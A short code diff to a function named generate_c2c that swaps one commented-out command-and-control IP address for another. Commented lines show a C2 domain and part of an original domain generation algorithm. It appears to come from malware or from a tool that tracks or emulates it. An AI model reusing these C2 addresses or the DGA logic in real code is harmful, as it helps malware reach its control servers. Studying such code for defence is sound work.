@@ -21,7 +21,7 @@ function generate_c2c()
     #return "33db9538.com";
 
     # We can also return directly the IP address of the C2
-    #return "45.32.203.126";
+    #return "31.184.192.173";
 
     # The original DGA:
     #$arr = str_split(md5('.com'.gethostbyname('stat-dns.com')), 8);
